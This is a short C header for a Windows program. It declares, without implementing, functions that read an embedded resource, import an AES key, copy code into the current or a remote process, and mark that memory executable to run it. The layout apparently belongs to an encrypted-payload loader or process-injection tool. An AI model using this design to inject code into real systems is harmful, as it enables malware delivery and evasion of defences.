#if !defined(__UTILITY_H__)
#define __UTILITY_H__

    #define MAX_STRING 100

    #define OKAY "[+]"
    #define INFO "[*]"
    #define FAIL "[!]"

    #define MESSAGE(X, ...) printf(X " " __VA_ARGS__)
    #define PRINT_ERROR(X) fprintf(stderr, FAIL " " #X " failed, error [x=0x%x,d=%lu] : %s somewhere in line[%d-%d]", GetLastError(), GetLastError(), __FILE__, __LINE__ - 3, __LINE__)

    int getResourceAddr(LPVOID *resAddr, DWORD *resSize, int intResource);
    int allowAndExecuteRemote(HANDLE  processHandle, LPVOID remoteAddr, DWORD codeSize);
    int allowAndExecute(LPVOID codeAddr, DWORD codeSize);
    int allocateAndCopyRemote( HANDLE processHandle, LPVOID * remoteAddr, LPCVOID code, DWORD codeSize);
    int allocateAndCopy(LPVOID * remoteAddr, LPCVOID code, DWORD codeSize);
    int getAesImportedKey(ALG_ID aesAlgo, const BYTE* algoMode, LPVOID key, DWORD keySize, BYTE initializationVector[], HCRYPTKEY *keyHandle, HCRYPTPROV *cspHandle);

#endif // __UTILITY_H__